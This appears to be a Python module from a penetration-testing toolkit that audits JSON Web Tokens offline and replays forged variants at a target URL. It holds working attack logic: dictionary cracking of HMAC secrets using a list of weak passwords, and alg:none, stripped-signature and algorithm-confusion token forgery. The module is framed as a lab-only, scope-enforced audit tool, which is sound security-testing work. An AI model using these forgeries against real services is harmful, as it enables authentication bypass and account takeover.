"""JWT tester — crack + alg-confusion, lab-only (Backlog #50).

Two explicit modes over a pasted token YOU own:

1. Offline audit (no network): base64url-decode the header/payload
   and flag unsigned (`alg: none`), missing/over-broad `exp`,
   `kid` path-traversal/SQL shapes, `jku`/`x5u` key-URL indirection,
   and HMAC secrets recovered by a capped dictionary crack (stdlib
   hmac+hashlib over a built-in weak-secret list plus an optional
   pasted wordlist, hard cap 20 000 attempts).

2. Live confusion test (opt-in `url`): replays `alg:none`,
   empty-signature, and `confusion_key`-as-HMAC-secret mutants at the
   endpoint and diffs against the operator's `authed_marker` — a
   surviving marker means the server accepted the forged token.

Only the operator-supplied `url` is ever requested. Findings ledger
as engagement vulns on the URL host (or the labeled host for offline
audits) when `engagement_id` is given (scope-enforced). Sandbox
returns canned findings without decoding anything.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

logger = logging.getLogger("h4k.jwtfuzz")

_BUILTIN_SECRETS: tuple[str, ...] = (
    "secret",
    "password",
    "123456",
    "qwerty",
    "letmein",
    "admin",
    "test",
    "jwt",
    "token",
    "changeme",
    "key",
    "dev",
    "local",
    "h4k",
    "passw0rd",
    "superset",
    "node",
    "react",
    "django",
    "flask",
    "laravel",
    "symfony",
    "spring",
    "secretkey",
    "mysecret",
    "topsecret",
    "s3cret",
    "p@ssw0rd",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "football",
    "shadow",
)

_MAX_CRACK = 20000


def _b64d(part: str) -> dict[str, Any]:
    padded = part + "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(padded.encode()).decode("utf-8"))


def decode_token(token: str) -> dict[str, Any]:
    """Split and decode a compact JWT; raises ValueError when malformed."""
    parts = (token or "").strip().split(".")
    if len(parts) != 3 or not parts[0] or not parts[1]:
        raise ValueError("token must look like header.payload.signature")
    try:
        header = _b64d(parts[0])
        payload = _b64d(parts[1])
    except (ValueError, UnicodeDecodeError) as exc:
        raise ValueError(f"token is not decodable JSON: {exc}") from exc
    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise ValueError("token header/payload must be JSON objects")
    return {"header": header, "payload": payload, "signature": parts[2]}


def _b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def _signing_input(token: str) -> bytes:
    head, payload, _ = token.strip().split(".")
    return f"{head}.{payload}".encode()


def crack_hmac(token: str, candidates: list[str], alg: str = "HS256") -> dict[str, Any]:
    """Dictionary-crack an HMAC-signed token (capped attempts)."""
    try:
        hashmod = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }[alg]
    except KeyError:
        return {"cracked": False, "attempts": 0, "error": f"unsupported alg {alg}"}
    want = token.strip().split(".")[2]
    tried = 0
    for secret in candidates[:_MAX_CRACK]:
        tried += 1
        digest = hmac.new(secret.encode(), _signing_input(token), hashmod).digest()
        if hmac.compare_digest(_b64e(digest), want):
            return {"cracked": True, "secret": secret, "attempts": tried}
    return {"cracked": False, "attempts": tried}


def audit_token(
    token: str, extra_secrets: list[str] | None = None, crack: bool = True
) -> dict[str, Any]:
    """Offline audit: structure flags + optional capped HMAC crack."""
    decoded = decode_token(token)
    header, payload = decoded["header"], decoded["payload"]
    findings: list[dict[str, Any]] = []

    alg = str(header.get("alg") or "")
    if alg.lower() == "none":
        findings.append(
            _finding(
                "CRITICAL",
                "token is unsigned (alg:none)",
                "signature segment present but alg:none asks verifiers to skip it",
                "alg",
            )
        )
    if header.get("jku") or header.get("x5u"):
        findings.append(
            _finding(
                "HIGH",
                "key URL indirection via jku/x5u header",
                f"jku={header.get('jku')} x5u={header.get('x5u')} (SSRF/key confusion surface)",
                "header",
            )
        )
    kid = str(header.get("kid") or "")
    if kid and (".." in kid or "/" in kid or "'" in kid or '"' in kid or ";" in kid):
        findings.append(
            _finding(
                "HIGH",
                "kid header looks injectable (traversal/SQL shapes)",
                f"kid={kid[:80]} (key lookup may hit files or SQL)",
                "kid",
            )
        )
    exp = payload.get("exp")
    now = int(time.time())
    if exp is None:
        findings.append(
            _finding(
                "MEDIUM",
                "no exp claim (tokens never expire)",
                "a stolen token stays valid indefinitely",
                "exp",
            )
        )
    elif isinstance(exp, (int, float)):
        if exp < now:
            findings.append(
                _finding(
                    "INFO",
                    "token already expired",
                    f"exp={int(exp)} < now (replay value is limited)",
                    "exp",
                )
            )
        elif exp - now > 30 * 24 * 3600:
            findings.append(
                _finding(
                    "MEDIUM",
                    "token lifetime exceeds 30 days",
                    f"exp is {int((exp - now) / 86400)}d out (long theft window)",
                    "exp",
                )
            )
    cracked: dict[str, Any] = {"cracked": False, "attempts": 0}
    if crack and alg in ("HS256", "HS384", "HS512"):
        candidates = list(_BUILTIN_SECRETS) + [s for s in (extra_secrets or []) if s]
        seen: set[str] = set()
        unique = [s for s in candidates if not (s in seen or seen.add(s))]  # type: ignore[func-returns-value]
        cracked = crack_hmac(token, unique, alg)
        if cracked.get("cracked"):
            findings.append(
                _finding(
                    "CRITICAL",
                    f"HMAC secret cracked in {cracked['attempts']} tries",
                    f"secret={cracked['secret']!r} (forge arbitrary tokens)",
                    "crack",
                )
            )
    return {
        "header": header,
        "payload": {k: payload[k] for k in list(payload)[:32]},
        "alg": alg,
        "cracked": cracked,
        "findings": findings,
        "finding_count": len(findings),
        "clean": not findings,
    }


def _finding(severity: str, title: str, evidence: str, where: str) -> dict[str, Any]:
    return {
        "severity": severity,
        "title": title,
        "evidence": evidence[:300],
        "where": where,
    }


def _send(url: str, token: str, timeout: float) -> dict[str, Any]:
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "h4k-audit", "Authorization": f"Bearer {token}"},
            method="GET",
        )
        with urllib.request.urlopen(
            req, timeout=timeout
        ) as resp:  # nosec B310 - operator-supplied lab target
            body = resp.read(8192).decode("utf-8", errors="replace")
            return {"status": resp.status, "body": body}
    except urllib.error.HTTPError as exc:
        try:
            body = exc.read(8192).decode("utf-8", errors="replace")
        except Exception:
            body = ""
        return {"status": exc.code, "body": body}
    except Exception as exc:
        return {"status": None, "body": "", "error": str(exc)[:160]}


def _mutants(token: str, confusion_key: str) -> list[tuple[str, str]]:
    head, payload, sig = token.strip().split(".")

    def enc(obj: Any) -> str:
        return _b64e(json.dumps(obj, separators=(",", ":")).encode())

    header = json.loads(
        base64.urlsafe_b64decode((head + "=" * (-len(head) % 4)).encode()).decode()
    )
    none_header = dict(header, alg="none")
    out = [
        ("alg-none", f"{enc(none_header)}.{payload}."),
        ("empty-sig", f"{head}.{payload}."),
        ("stripped-sig", f"{head}.{payload}"),
    ]
    if confusion_key.strip():
        for alg in ("HS256", "HS384", "HS512"):
            try:
                hashmod = {
                    "HS256": hashlib.sha256,
                    "HS384": hashlib.sha384,
                    "HS512": hashlib.sha512,
                }[alg]
                forged = dict(header, alg=alg)
                signing = f"{enc(forged)}.{payload}".encode()
                digest = hmac.new(confusion_key.encode(), signing, hashmod).digest()
                out.append((f"confused-{alg}", f"{signing.decode()}.{_b64e(digest)}"))
            except (ValueError, KeyError):
                continue
    _ = sig
    return out


def confusion_test(
    url: str,
    token: str,
    authed_marker: str,
    confusion_key: str = "",
    timeout: float = 8.0,
) -> dict[str, Any]:
    """Replay forged tokens; a surviving marker means acceptance."""
    url = (url or "").strip()
    if not url.startswith(("http://", "https://")):
        raise ValueError("url must be an http(s) URL you own")
    marker = (authed_marker or "").strip()
    if not marker:
        raise ValueError("authed_marker required (verdicts need a baseline signal)")
    decoded = decode_token(token)  # validates shape up front
    _ = decoded
    base = _send(url, token, timeout)
    if base.get("error"):
        raise ValueError(f"baseline unreachable: {base['error']}")
    if marker not in (base.get("body") or ""):
        return {
            "url": url,
            "probes": [],
            "probe_count": 0,
            "findings": [],
            "finding_count": 0,
            "clean": True,
            "note": "authed_marker absent with the original token — check token/marker",
        }
    probes: list[dict[str, Any]] = []
    for name, forged in _mutants(token, confusion_key):
        res = _send(url, forged, timeout)
        accepted = marker in (res.get("body") or "")
        probes.append(
            {
                "name": name,
                "verdict": "FINDING" if accepted else "SAFE",
                "evidence": (
                    f"server accepted {name} forged token"
                    if accepted
                    else f"{name} rejected (status {res.get('status')})"
                ),
                "severity": "CRITICAL" if accepted else "",
                "status": res.get("status"),
            }
        )
    findings = [
        {
            "probe": p["name"],
            "severity": p["severity"],
            "title": f"server accepts {p['name']} forged tokens",
            "evidence": p["evidence"],
        }
        for p in probes
        if p["verdict"] == "FINDING"
    ]
    return {
        "url": url,
        "probes": probes,
        "probe_count": len(probes),
        "findings": findings,
        "finding_count": len(findings),
        "clean": not findings,
    }


def to_ledger(
    host: str, url: str, findings: list[dict[str, Any]]
) -> list[dict[str, Any]]:
    """Map JWT findings to engagement vuln rows for the URL host."""
    rows: list[dict[str, Any]] = []
    for finding in findings:
        rows.append(
            {
                "host": host,
                "name": f"jwt {finding.get('probe', finding.get('where', 'jwt'))} via {url}"[
                    :220
                ],
                "severity": str(finding.get("severity") or "UNKNOWN").upper(),
                "module": "jwt-tester",
                "reference": "",
                "cwe": "CWE-287",
                "detail": f"{finding.get('title', '')} evidence={finding.get('evidence', '')}".strip()[
                    :400
                ],
            }
        )
    return rows


def sandbox_result(url: str = "http://lab.local/api") -> dict[str, Any]:
    """Canned audit + confusion (nothing decoded, nothing requested)."""
    findings = [
        {
            "probe": "audit",
            "severity": "CRITICAL",
            "title": "token is unsigned (alg:none) (sandbox)",
            "evidence": "alg:none in header (sandbox)",
            "where": "alg",
        },
        {
            "probe": "alg-none",
            "severity": "CRITICAL",
            "title": "server accepts alg-none forged tokens (sandbox)",
            "evidence": "server accepted alg-none forged token (sandbox)",
        },
    ]
    return {
        "url": url or "http://lab.local/api",
        "audit": {"alg": "none", "cracked": {"cracked": False, "attempts": 38}},
        "probes": [
            {
                "name": "alg-none",
                "verdict": "FINDING",
                "evidence": findings[1]["evidence"],
                "severity": "CRITICAL",
                "status": 200,
            },
            {
                "name": "empty-sig",
                "verdict": "SAFE",
                "evidence": "empty-sig rejected (status 401) (sandbox)",
                "severity": "",
                "status": 401,
            },
        ],
        "probe_count": 2,
        "findings": findings,
        "finding_count": len(findings),
        "clean": False,
        "sandbox": True,
    }
